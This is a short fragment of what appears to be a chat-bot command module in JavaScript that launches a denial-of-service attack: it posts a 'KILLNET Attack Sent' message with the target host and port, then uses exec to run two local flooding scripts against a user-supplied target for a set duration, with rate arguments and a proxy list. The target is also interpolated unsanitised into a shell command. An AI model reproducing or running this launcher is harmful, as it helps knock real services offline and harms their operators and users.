...
╭━✧「 <b>KILLNET Attack Sent Succes</b> ✅ 」
┃🎯 <b>Host:</b> ${hostname}
┃📍 <b>Port:</b> ${port}
...
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═0
    ...
    const killnet = path.join(__dirname, `../lib/cache/killnet`);
    const scriptPath = path.join(__dirname, "../lib/cache/1");
    exec(`node ${scriptPath} ${target} ${duration}`);
    exec(`node ${killnet} ${target} ${duration} 64 16 proxy.txt`);
  },
};